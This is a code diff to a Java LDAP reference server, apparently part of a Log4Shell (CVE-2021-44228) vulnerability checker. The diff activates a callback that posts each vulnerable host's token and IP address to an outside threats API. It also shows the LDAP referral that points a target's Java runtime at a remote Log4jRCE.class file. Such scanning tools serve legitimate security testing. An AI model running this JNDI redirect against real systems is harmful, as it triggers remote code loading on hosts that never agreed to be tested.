@@ -175,42 +175,43 @@ public class LDAPRefServer {
                         {
                             conn.token = matcher2.group(5);
                             System.out.println("Matches connection ID: " + conn.connid + " with Token : " + conn.token + " with IP Address: " + conn.ipaddress);
-                        }
-                    });
-                    //  //Hacer peticion a API de Threats para notificar que es vulnerable
-                    //  URL url = new URL ("https://api.threats.kapa7.com/api/CVEChecks/cve_2021_44228");
-                    //  try
-                    //  {
-                    //      HttpURLConnection con = (HttpURLConnection)url.openConnection();
-                    //      con.setRequestMethod("POST");
-                    //      con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                    //      con.setRequestProperty("Accept", "application/json");
-                    //      con.setDoOutput(true);
-                    //      String jsonInputString = "token=" + base;
-                        
-                    //      OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
-                    //      wr.write(jsonInputString);
-                    //      wr.flush();
-                    //      wr.close();
+                            //Hacer peticion a API de Threats para notificar que es vulnerable
+                            try
+                            {
+                                URL url = new URL ("https://api.threats.kapa7.com/api/CVEChecks/cve_2021_44228");
+                                HttpURLConnection con = (HttpURLConnection)url.openConnection();
+                                con.setRequestMethod("POST");
+                                con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                                con.setRequestProperty("Accept", "application/json");
+                                con.setDoOutput(true);
+                                String jsonInputString = "token=" + conn.token + "&ip=" + conn.ipaddress;
+                                
+                                OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
+                                wr.write(jsonInputString);
+                                wr.flush();
+                                wr.close();
 
-                    //      try(BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "utf-8"))) 
-                    //      {
-                    //          StringBuilder response = new StringBuilder();
-                    //          String responseLine = null;
-                    //          while ((responseLine = br.readLine()) != null) {
-                    //              response.append(responseLine.trim());
-                    //          }
-                    //          System.out.println(response.toString());
-                    //      }
-                    //      catch(Exception ex)
-                    //      {
-                    //          System.out.println(ex.getMessage());
-                    //      }
-                    //  }
-                    //  catch(Exception ex)
-                    //  {
-                    //      System.out.println(ex.getMessage());
-                    //  }
+                                try(BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "utf-8"))) 
+                                {
+                                    StringBuilder response = new StringBuilder();
+                                    String responseLine = null;
+                                    while ((responseLine = br.readLine()) != null) {
+                                        response.append(responseLine.trim());
+                                    }
+                                    System.out.println(response.toString());
+                                }
+                                catch(Exception ex)
+                                {
+                                    System.out.println(ex.getMessage());
+                                }
+                            }
+                            catch(Exception ex)
+                            {
+                                System.out.println(ex.getMessage());
+                            }
+                                }
+                            });
+
                 }
             }
             catch(Exception ex)
@@ -256,7 +257,7 @@ public class LDAPRefServer {
             
             URL turl = new URL("https://threats.kapa7.com/assets/Log4jRCE.class");
 
-            System.out.println("Send LDAP reference result for token " + base + ", redirecting to " + turl);
+            //System.out.println("Send LDAP reference result for token " + base + ", redirecting to " + turl);
             // e.addAttribute("javaClassName", "foo");
             // e.addAttribute("javaCodeBase", "https://threats.kapa7.com/assets/");
             // e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
